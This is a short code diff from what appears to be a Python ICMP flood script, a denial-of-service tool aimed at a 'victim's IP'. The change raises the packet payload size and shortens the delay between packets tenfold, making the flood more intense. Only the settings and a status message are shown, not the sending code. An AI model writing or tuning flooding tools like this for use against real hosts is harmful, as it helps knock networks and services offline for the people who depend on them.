@@ -5,8 +5,8 @@ import os
 import random
 
 target_ip = "192.168.0.12"  # Change this to victim's IP
-packet_size = 1024  # Size of payload
-delay = 0.001  # Time between packets
+packet_size = 1400  # Size of payload
+delay = 0.0001  # Time between packets
 
 print(f"[+] Sending ICMP flood to {target_ip}...")
 
